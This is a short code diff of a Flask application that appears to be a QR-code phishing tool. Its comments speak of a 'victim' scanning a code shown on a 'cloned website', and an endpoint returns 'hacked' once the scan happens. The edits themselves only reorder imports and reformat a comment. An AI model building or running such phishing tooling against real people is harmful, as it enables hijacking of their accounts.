@@ -1,7 +1,7 @@
-from flask import Flask, request, render_template, send_from_directory, jsonify, g
 import base64
 import os
 
+from flask import Flask, request, render_template, send_from_directory
 
 app = Flask(__name__)
 
@@ -33,7 +33,7 @@ def get_qr():
     if request.method == 'GET':
         if not os.path.isfile('hacked'):  # if there is no hacked file, the victim still has to scan
             return get_png_b64()
-        else:                             # else, the victim scanned the qr code. We tell so to the cloned website
+        else:  # else, the victim scanned the qr code. We tell so to the cloned website
             print('hacked')
             return 'hacked'
 
